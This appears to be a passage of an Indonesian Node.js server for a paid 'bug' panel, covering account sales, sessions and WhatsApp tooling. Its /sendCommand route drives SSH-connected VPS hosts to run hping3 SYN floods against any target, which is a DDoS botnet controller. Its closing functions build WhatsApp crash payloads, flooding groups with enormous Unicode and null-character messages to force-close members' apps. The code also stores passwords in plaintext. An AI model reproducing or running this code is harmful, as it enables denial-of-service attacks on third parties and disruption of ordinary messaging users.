  `👤 Creator: \`${newSetoran.creatorUsername}\`\n` +
  `🆕 Akun Baru: \`${newSetoran.newUsername}\` (${newSetoran.newUserRole})\n` +
  `💰 Transfer: Rp${Number(newSetoran.jumlahTransfer).toLocaleString('id-ID')}\n` +
  `🆔 Request ID: \`${newSetoran.requestId}\``,
  {
    title: '📥 SETORAN BARU',
    footer: `⏰ ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`
  }
).catch(() => {});

    res.json({ valid: true, message: "Diterima", setoran: newSetoran });
  } catch (err) {
    logError("[SETORAN] submit error:", err.message);
    res.status(500).json({ valid: false, message: err.message });
  }
});

// 2. LIST
app.get("/listSetoran", (req, res) => {
  try {
    const { key, status, creator } = req.query;
    const auth = validateSetoranKey(key);
    if (!auth.valid) return res.status(401).json({ valid: false });

    const isAdmin = ["owner", "developer", "admin"].includes((auth.role || "").toLowerCase());
    let list = loadSetoran();

    if (!isAdmin && !auth.isBot) list = list.filter(s => s.creatorUsername === auth.username);
    else if (creator) list = list.filter(s => s.creatorUsername === creator);
    if (status) list = list.filter(s => s.status === status);

    list.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
    res.json({ valid: true, setoran: list });
  } catch (err) { res.status(500).json({ valid: false, message: err.message }); }
});

// ═══════════════════════════════════════════════════════════════════
// [FULL FIX] /accSetoran — Fix missing 's' variable + double-ACC guard
// ═══════════════════════════════════════════════════════════════════
app.get("/accSetoran", async (req, res) => {
  try {
    const { key, requestId, username, password, day, role } = req.query;
    const auth = validateSetoranKey(key);
    if (!auth.valid) {
      return res.status(401).json({ valid: false, approved: false, message: "Invalid key" });
    }

    if (!auth.isBot && !["owner", "developer", "admin"].includes((auth.role || "").toLowerCase())) {
      return res.status(403).json({ valid: false, approved: false, message: "Akses ditolak" });
    }

    // ─── CARI SETORAN DI LIST ─────────────────────────────────
    const list = loadSetoran();
    const idx = list.findIndex(s => s.requestId === requestId);
    if (idx === -1) {
      return res.json({ valid: false, approved: false, message: "Setoran tidak ditemukan" });
    }

    const s = list[idx];
    if (s.status !== "pending") {
      return res.json({
        valid: false,
        approved: false,
        message: `Setoran sudah ${s.status}`,
      });
    }

    // ─── CEK USERNAME SUDAH ADA DI DB ─────────────────────────
    const db = loadDatabase();
    const existing = db.find(u => u.username === s.newUsername);

    if (existing) {
      // Kalau user ini dibuat dari SETORAN YANG SAMA → double-ACC, anggap sukses
      if (existing.fromSetoran === s.requestId) {
        logWarning(`[SETORAN] ⚠️ Double ACC terdeteksi: ${s.requestId}`);
        return res.json({
          valid: true,
          approved: true,
          message: "Sudah di-ACC sebelumnya",
          account: existing,
        });
      }

      // User dari sumber lain → reject setoran
      s.status = "rejected";
      s.processedAt = new Date().toISOString();
      s.processedBy = auth.username;
      s.reason = "Username sudah dipakai";
      saveSetoran(list);
      return res.json({
        valid: false,
        approved: false,
        message: "Username sudah dipakai",
      });
    }

    // ─── BUAT AKUN BARU ───────────────────────────────────────
    const durasi = Number(day) || s.durasiHari || 30;
    const expired = new Date();
    expired.setDate(expired.getDate() + durasi);

    const newAccount = {
      username: username || s.newUsername,
      password: password || s.newPassword,
      role: (role || s.newUserRole || "member").toLowerCase(),
      expiredDate: expired.toISOString().split("T")[0],
      createdBy: s.creatorUsername,
      creatorName: s.creatorUsername,
      creatorRole: s.creatorRole,
      createdAt: new Date().toISOString(),
      fromSetoran: s.requestId,
      isBanned: false,
    };

    db.push(newAccount);
    saveDatabase(db);

    // ─── UPDATE STATUS SETORAN ────────────────────────────────
    s.status = "approved";
    s.processedAt = new Date().toISOString();
    s.processedBy = auth.username;
    saveSetoran(list);

    // ─── LOG & NOTIF ──────────────────────────────────────────
    saveUserLog(s.creatorUsername, "setoran", "Setoran ACC", `${newAccount.username}`);
    logSuccess(`[SETORAN] ✅ ACC: ${newAccount.username} (${newAccount.role}) by ${auth.username}`);

    // ─── FCM NOTIF (kalau creator punya token) ────────────────
    const creator = db.find(u => u.username === s.creatorUsername);
    if (creator?.fcmToken) {
      try {
        await admin.messaging().sendEachForMulticast({
          notification: {
            title: "✅ Setoran Disetujui",
            body: `Akun ${newAccount.username} berhasil dibuat!`,
          },
          data: { type: "setoran", status: "approved" },
          tokens: [creator.fcmToken],
        });
      } catch (e) {
        logWarning(`[SETORAN] FCM error: ${e.message}`);
      }
    }

    res.json({
      valid: true,
      approved: true,
      message: "Berhasil di-ACC",
      account: newAccount,
    });

  } catch (err) {
    logError("[SETORAN] accSetoran error:", err.message);
    res.status(500).json({
      valid: false,
      approved: false,
      message: err.message,
    });
  }
});

// 4. REJECT
app.get("/rejectSetoran", async (req, res) => {
  try {
    const { key, requestId, reason } = req.query;
    const auth = validateSetoranKey(key);
    if (!auth.valid) return res.status(401).json({ valid: false, rejected: false });

    if (!auth.isBot && !["owner", "developer", "admin"].includes((auth.role || "").toLowerCase()))
      return res.status(403).json({ valid: false, rejected: false, message: "Akses ditolak" });

    const list = loadSetoran();
    const idx = list.findIndex(s => s.requestId === requestId);
    if (idx === -1) return res.json({ valid: false, rejected: false, message: "Tidak ditemukan" });

    const s = list[idx];
    if (s.status !== "pending") return res.json({ valid: false, rejected: false, message: `Sudah ${s.status}` });

    s.status = "rejected";
    s.processedAt = new Date().toISOString();
    s.processedBy = auth.username;
    s.reason = reason || "Ditolak owner";
    saveSetoran(list);

    res.json({ valid: true, rejected: true, message: "Ditolak" });
  } catch (err) { res.status(500).json({ valid: false, rejected: false, message: err.message }); }
});

// 5. STATUS (polling)
app.get("/setoran/status", (req, res) => {
  try {
    const { key, requestId } = req.query;
    const auth = validateSetoranKey(key);
    if (!auth.valid) return res.status(401).json({ valid: false });
    const s = loadSetoran().find(x => x.requestId === requestId);
    if (!s) return res.json({ valid: true, found: false });
    res.json({ valid: true, found: true, status: s.status, reason: s.reason, processedAt: s.processedAt });
  } catch (err) { res.status(500).json({ valid: false, message: err.message }); }
});

// 6. HISTORY
app.get("/setoran/history", (req, res) => {
  try {
    const { key } = req.query;
    const auth = validateSetoranKey(key);
    if (!auth.valid) return res.status(401).json({ valid: false });
    const list = loadSetoran()
      .filter(s => s.creatorUsername === auth.username)
      .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
    const totalApproved = list.filter(s => s.status === "approved").reduce((a, s) => a + Number(s.jumlahTransfer || 0), 0);
    res.json({ valid: true, total: list.length, totalApproved, data: list });
  } catch (err) { res.status(500).json({ valid: false, message: err.message }); }
});

// 7. STATS
app.get("/setoran/stats", (req, res) => {
  try {
    const { key } = req.query;
    const auth = validateSetoranKey(key);
    if (!auth.valid) return res.status(401).json({ valid: false });
    if (!auth.isBot && !["owner", "developer", "admin"].includes((auth.role || "").toLowerCase()))
      return res.status(403).json({ valid: false, message: "Akses ditolak" });

    const list = loadSetoran();
    res.json({
      valid: true,
      stats: {
        total: list.length,
        pending: list.filter(s => s.status === "pending").length,
        approved: list.filter(s => s.status === "approved").length,
        rejected: list.filter(s => s.status === "rejected").length,
        totalRevenue: list.filter(s => s.status === "approved").reduce((a, s) => a + Number(s.jumlahTransfer || 0), 0),
      },
    });
  } catch (err) { res.status(500).json({ valid: false, message: err.message }); }
});

// 8. PRICES
app.get("/setoran/prices", (req, res) => {
  res.json({ valid: true, prices: JSON.parse(fs.readFileSync(PRICE_FILE, "utf8")) });
});

app.post("/setoran/prices", (req, res) => {
  const { key, prices } = req.body;
  const auth = validateSetoranKey(key);
  if (!auth.valid) return res.status(401).json({ valid: false });
  if (!["owner", "developer"].includes((auth.role || "").toLowerCase()))
    return res.status(403).json({ valid: false });
  fs.writeFileSync(PRICE_FILE, JSON.stringify(prices, null, 2));
  res.json({ valid: true });
});

// 9. EXPORT
app.get("/setoran/export", (req, res) => {
  const { key } = req.query;
  const auth = validateSetoranKey(key);
  if (!auth.valid) return res.status(401).end();
  if (!["owner", "developer"].includes((auth.role || "").toLowerCase())) return res.status(403).end();

  const list = loadSetoran();
  let csv = "RequestID,Creator,AkunBaru,Role,Durasi,Harga,Transfer,Status,CreatedAt\n";
  list.forEach(s => {
    csv += `"${s.requestId}","${s.creatorUsername}","${s.newUsername}","${s.newUserRole}",${s.durasiHari},${s.harga},"${s.jumlahTransfer}","${s.status}","${s.createdAt}"\n`;
  });
  res.setHeader("Content-Type", "text/csv");
  res.setHeader("Content-Disposition", `attachment; filename=setoran_${Date.now()}.csv`);
  res.send(csv);
});

// ==========================================================
// [END SETORAN]
// ==========================================================
// module.exports = app; // Uncomment jika file ini dipisah

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    logError(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    logSuccess("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    logError("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  logSuccess("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      logSuccess(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      logSuccess(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        logWarning(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          logWarning(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      logError(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  logError("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  logSuccess("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    logSuccess("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    logError("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  if (!keyInfo || !keyInfo.username) return null;   // ← TAMBAH GUARD INI
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/ckeyServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      logError(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return logError(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        logSuccess(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

// ========== FUNGSI DATABASE YANG BENAR (PAKAI DB_PATH) ==========
function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    logSuccess("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  logSuccess("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const dateToCheck = user.expiredAt || user.expiredDate;
  const expired = new Date(dateToCheck) < new Date();
  logSuccess(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
// ========== END FUNGSI DATABASE ==========

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    logError("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    logError("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

app.post("/validate", async (req, res) => {
  const { username, password, version, androidId, appVersion, appCertificate } = req.body;
  
  const security = readAppSecurity();
  if (!appVersion || !appCertificate) {
    return res.status(403).json({
      valid: false,
      error: "SECURITY_REQUIRED",
      message: "appVersion dan appCertificate wajib dikirim."
    });
  }
  if (
  (security.version && appVersion !== security.version) ||
  (security.certificate && appCertificate !== security.certificate)
) {
  return res.status(403).json({
    valid: false,
    error: "SECURITY_FAILED",
    message: "Versi APK atau certificate tidak valid."
  });
}

  if (!androidId) return res.json({ valid: false, message: "androidId required" });

  // CEK MAINTENANCE
  const maintenance = readMaintenance();
  if (maintenance.active) {
    return res.json({ valid: false, maintenance: true, message: maintenance.reason || "Server sedang dalam pemeliharaan." });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  // AUTO-FIX ISBANNED
  if (user.isBanned === undefined) {
    user.isBanned = false;
    saveDatabase(db);
  }

  // CEK BANNED
  if (user.isBanned) {
    return res.json({ valid: false, banned: true, message: "Akun Anda telah dibanned oleh Admin." });
  }

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  // ─── AUTO-SYNC ROLE DARI GRUP TELEGRAM ───
  let finalRole = user.role || "member";
  if (user.telegramId) {
    try {
      const syncResult = await syncUserRoleFromGroups(user.telegramId);
      if (syncResult.success) {
        const freshDb = loadDatabase();
        const freshUser = freshDb.find(u => u.username === username);
        if (freshUser) finalRole = freshUser.role || "member";
        logSuccess(`[VALIDATE-SYNC] ${username} → ${finalRole}`);
      }
    } catch (e) {
      logError('[VALIDATE-SYNC]', e.message);
    }
  }

  saveUserLog(username, "login", "Login Berhasil", `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`);

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: finalRole,
    listBug: bugs,
    listBugGroup: buggc,
    news,
    jjVideos,
    thanksTo
  });
});

app.get("/updateFCM", (req, res) => {
  const { key, token } = req.query;

  if (!key || !token) {
    return res.json({
      success: false,
      message: "Missing key or token."
    });
  }

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({
      success: false,
      message: "Invalid session."
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    return res.json({
      success: false,
      message: "User not found."
    });
  }

  user.fcmToken = token;
  saveDatabase(db);

  res.json({
    success: true,
    message: "FCM token updated."
  });
});

app.get("/send/notification", async (req, res) => {
  try {
    const { key, title, message, type } = req.query;

    if (!key || !title || !message || !type) {
      return res.status(400).json({
        success: false,
        error: "key, title, message, type wajib diisi."
      });
    }

    const keyInfo = activeKeys[key];

    if (!keyInfo) {
      return res.status(401).json({
        success: false,
        error: "Session invalid."
      });
    }


    const db = loadDatabase();

    const sender = db.find(
      u => u.username === keyInfo.username
    );


    if (!sender) {
      return res.status(404).json({
        success:false,
        error:"User tidak ditemukan."
      });
    }


    // ROLE CHECK
    const role = (sender.role || "user").toLowerCase();

    if (role !== "developer" &&
        role !== "admin" &&
        role !== "owner") {

      return res.status(403).json({
        success:false,
        error:"Hanya developer ke atas yang bisa mengirim."
      });
    }


    // AMBIL TOKEN FCM
    const tokens = db
      .filter(
        u =>
          u.fcmToken &&
          u.username !== sender.username
      )
      .map(
        u => u.fcmToken
      );


    if (!tokens.length) {
      return res.json({
        success:false,
        error:"Tidak ada FCM token."
      });
    }



    const typeColor = {
      info:"#2196F3",
      warning:"#FF9800",
      success:"#22C55E",
      error:"#EF4444",
      announcement:"#A855F7"
    };


    const color =
      typeColor[type] || "#22C55E";



    const payload = {

      notification:{
        title:title,
        body:message
      },


      data:{
        type:String(type),
        title:String(title),
        message:String(message),
        sender:String(sender.username),
        timestamp:
          new Date().toISOString()
      },


      android:{
        priority:"high",

        notification:{
          channelId:"default",
          color:color,
          sound:"default",
          icon:"ic_notification"
        }
      },


      apns:{
        payload:{
          aps:{
            sound:"default",
            badge:1
          }
        }
      },


      tokens:tokens
    };



    const result =
      await admin
      .messaging()
      .sendEachForMulticast(payload);



    // HAPUS TOKEN INVALID

    const removeToken=[];


    result.responses.forEach(
      (r,i)=>{

        if(!r.success){

          const code =
            r.error?.code;


          if(
            code ===
            "messaging/registration-token-not-registered" ||
            code ===
            "messaging/invalid-registration-token"
          ){

            removeToken.push(tokens[i]);

          }

        }

      }
    );



    if(removeToken.length){

      db.forEach(u=>{

        if(
          u.fcmToken &&
          removeToken.includes(u.fcmToken)
        ){

          delete u.fcmToken;

        }

      });


      saveDatabase(db);

      console.log(
        `[FCM] removed ${removeToken.length} expired token`
      );

    }



    console.log(
      `[FCM] ${sender.username} sent ${result.successCount}/${tokens.length}`
    );



    return res.json({

      success:true,

      sent:
        result.successCount,

      failed:
        result.failureCount,

      total:
        tokens.length

    });



  } catch(err){

    console.error(
      "[FCM ERROR]",
      err
    );


    res.status(500).json({

      success:false,

      error:err.message

    });

  }
});

app.get("/myInfo", async (req, res) => {
  const { username, password, androidId, key, appVersion,appCertificate } = req.query;
  
  const security = readAppSecurity();
  if (!appVersion || !appCertificate) {
    return res.status(403).json({
      valid: false,
      error: "SECURITY_REQUIRED",
      message: "appVersion dan appCertificate wajib dikirim."
    });
  }
  if (
  (security.version && appVersion !== security.version) ||
  (security.certificate && appCertificate !== security.certificate)
) {
  return res.status(403).json({
    valid: false,
    error: "SECURITY_FAILED",
    message: "Versi APK atau certificate tidak valid."
  });
}


  // CEK MAINTENANCE
  const maintenance = readMaintenance();
  if (maintenance.active) {
    return res.json({ valid: false, maintenance: true, message: maintenance.reason || "Server sedang dalam pemeliharaan." });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);

  if (!userKey) return res.json({ valid: false, reason: "session" });
  if (userKey.androidId !== androidId) return res.json({ valid: false, reason: "device" });
  if (!user) return res.json({ valid: false });

  // CEK BANNED
  if (user.isBanned) {
    return res.json({ valid: false, banned: true, message: "Akun Anda telah dibanned oleh Admin." });
  }

  if (isExpired(user)) return res.json({ valid: true, expired: true });

  recordKey({ username, key, role: user.role || 'member', ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip, androidId });

// ─── AUTO-SYNC ROLE ───
let finalRole = user.role || "member";
if (user.telegramId) {
  try {
    const syncResult = await syncUserRoleFromGroups(user.telegramId);
    if (syncResult.success) {
      const freshDb = loadDatabase();
      const freshUser = freshDb.find(u => u.username === username);
      if (freshUser) finalRole = freshUser.role || "member";
    }
  } catch (e) {
    logError('[MYINFO-SYNC]', e.message);
  }
}

return res.json({
  valid: true,
  expired: false,
  key,
  username: user.username,
  password: "******",
  expiredDate: user.expiredDate,
  role: finalRole,
  listBug: bugs,
  listBugGroup: buggc,
  news: news,
  jjVideos: jjVideos,
  thanksTo: thanksTo
  }); // <- TAMBAHKAN KURUNG KURAWAL INI
});   // <- INI PENUTUP FUNGSI /myInfo

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

function getNextId() {
  const data = readMessages();
  const nextId = data.messageIdCounter;
  data.messageIdCounter++;
  writeMessages(data);
  return nextId;
}

// Tambahkan API baru buat list contact private chat:
app.get("/api/chatUsers", (req, res) => {
  const db = loadDatabase();
  const users = db.map(u => ({
    username: u.username,
    displayName: u.displayName || u.username,
    role: u.role || "member",
    profileImageUrl: u.profileImageUrl || null,
    bio: u.bio || null,
    followers: db.filter(x => Array.isArray(x.following) && x.following.includes(u.username)).length,
    following: (u.following || []).length,
  }));
  res.json({ success: true, users });
});

app.get("/wget/consolelog", (req, res) => {
    const logFile = path.join(__dirname, "logUser.txt"); // sesuaikan path

    fs.readFile(logFile, "utf8", (err, data) => {
        if (err) {
            return res.status(200).send("No logs available.");
        }

        res.setHeader("Content-Type", "text/plain; charset=utf-8");
        res.send(data);
    });
});

// ========== FUNGSI BAN GROUP UNTUK WHATSAPP ==========
async function groupBan(sock, target) {
  // ✅ GUARD: pastikan target valid string
  if (typeof target !== 'string') {
    throw new Error("Target harus string JID grup (@g.us)");
  }
  if (!target.endsWith("@g.us")) {
    throw new Error("@g.us server required (target harus JID grup)");
  }
  
  try {
    await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add");
    logSuccess(`[groupBan] Success ban target ${target}`);
  } catch (e) {
    logError(`[groupBan] Error: ${e.message}`);
    throw e;
  }
}

// ═══════════════════════════════════════════════════════════════════════
// [🔥🔥🔥] BUG GROUP BRUTAL V1 — FULL PACKAGE
// Target: GROUP (@g.us) — Tembus UI Android + FC massal
// ═══════════════════════════════════════════════════════════════════════

// ─────────────────────────────────────────────────────────────────────
// [1] xofmGroup — BRUTAL UI BREAKER (tema xofm original)
// ─────────────────────────────────────────────────────────────────────
async function xofmGroup(sock, target) {
  if (typeof target !== 'string') throw new Error('Target harus string JID group');
  if (!target.endsWith("@g.us")) throw new Error('Target harus GROUP (@g.us), bukan nomor');

  const groupJid = target;
  logSuccess(`[xofmGroup] 🔥 Mulai FC group: ${groupJid}`);

  let metadata;
  try {
    metadata = await sock.groupMetadata(groupJid);
  } catch (e) {
    throw new Error(`Bot harus join group dulu: ${e.message}`);
  }
  const members = metadata.participants.map(p => p.id);
  logSuccess(`[xofmGroup] Group: ${metadata.subject} | ${members.length} member`);

  for (let i = 0; i < 5; i++) {
    await sleep(400);

    // Layer 1: externalAdReply + nativeFlow EXTREME
    try {
      const msg = generateWAMessageFromContent(
        groupJid,
        {
          groupStatusMessageV2: {
            message: {
              interactiveMessage: {
                body: { text: "ี".repeat(100000) + "\u0000".repeat(50000) },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(200000),
                  buttons: "ี".repeat(2000000)
                },
                contextInfo: {
                  remoteJid: "#",
                  stanzaId: "3EB0" + "X".repeat(8000),
                  participant: "0@s.whatsapp.net",
                  mentionedJid: members,
                  isForwarded: true,
                  forwardingScore: 999999,
                  externalAdReply: {
                    showAdAttribution: true,
                    title: 'vault!nspect'.repeat(2000),
                    body: 'superior3xplanation'.repeat(2000),
                    thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                    sourceUrl: 'https://vsp-killer.gov/' + "A".repeat(5000),
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    previewType: 5
                  }
                }
              }
            }
          }
        },
        {}
      );
      await sock.relayMessage(groupJid, msg.message, {});
      await sock.chatModify({
        delete: true,
        lastMessages: [{ key: { remoteJid: groupJid, fromMe: true, id: msg.key.id }, messageTimestamp: Date.now() }]
      }, groupJid).catch(() => {});
    } catch (e) { logWarning(`[xofmGroup] layer1: ${e.message}`); }

    // Layer 2: Interactive Response
    try {
      await sock.relayMessage(groupJid, {
        interactiveResponseMessage: {
          body: { text: "\u0000".repeat(200000) + "ꦽ".repeat(100000), format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: JSON.stringify({
              wa_flow_response_params: {
                title: "﷽".repeat(100000),
                subtitle: "؂".repeat(100000),
                buttons: Array.from({ length: 10000 }, () => ({
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(1000)
                }))
              }
            }),
            version: 3
          },
          contextInfo: {
            mentionedJid: members,
            isForwarded: true,
            forwardingScore: 999999,
            businessMessageForwardInfo: { businessOwnerJid: "13135550002@s.whatsapp.net" }
          }
        }
      }, { participant: { jid: groupJid } });
    } catch (e) { logWarning(`[xofmGroup] layer2: ${e.message}`); }

    // Layer 3: Heavy ExtendedText
    try {
      await sock.relayMessage(groupJid, {
        extendedTextMessage: {
          text: "ꦽ".repeat(500000) + "\u0000".repeat(200000),
          description: "﷽".repeat(30000),
          fontType: 6,
          previewType: 9,
          contextInfo: {
            mentionedJid: members,
            isForwarded: true,
            forwardingScore: 999999,
            externalAdReply: {
              showAdAttribution: true,
              title: "ꦽ".repeat(50000),
              body: "؂".repeat(50000),
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }, { participant: true });
